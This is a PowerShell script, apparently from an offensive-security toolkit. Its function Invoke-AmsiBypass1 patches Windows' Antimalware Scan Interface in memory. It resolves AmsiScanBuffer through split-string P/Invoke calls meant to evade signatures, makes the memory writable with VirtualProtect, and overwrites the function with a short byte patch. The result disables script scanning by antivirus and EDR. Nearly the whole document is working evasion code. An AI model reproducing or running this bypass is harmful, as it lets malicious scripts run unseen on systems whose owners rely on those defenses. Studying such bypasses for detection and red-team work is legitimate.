<#
.SYNOPSIS
Microsoft has developed AMSI (Antimalware Scan Interface) as a method to defend against common malware execution and protect the end user. 
By default EDRs consumes AMSI events as part of interpreted script detection during runtime, its also the first protection against obfuscation.

.DESCRIPTION
Antimalware Scan Interface by patching AmsiScanBuffer function 
 
.EXAMPLE
Invoke-AmsiBypass1
 
Description
-----------
Patching AmsiScanBuffer
#>


$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32",EntryPoint="Get"+"Proc"+"Address")]
    public static extern IntPtr gpa(IntPtr hModule, string procName);

    [DllImport("kernel32",EntryPoint="Load"+"Library")]
    public static extern IntPtr ll(string name);

    [DllImport("kernel32",EntryPoint="Virtual"+"Protect")]
    public static extern bool vp(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@



function Invoke-AmsiBypass1 {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $false)]
        [String]$program= ''
    )
    Begin {
		Add-Type $Win32
    }

    Process {
		$LoadLibrary = [Win32]::ll("am" + "si.dll")
		$Address = [Win32]::gpa($LoadLibrary, "Amsi" + "Scan" + "Buffer")
		$p = 0
		[Win32]::vp($Address, [uint32]7, 0x40, [ref]$p)
		$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3,0xC3)
		[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 7)

    }

}
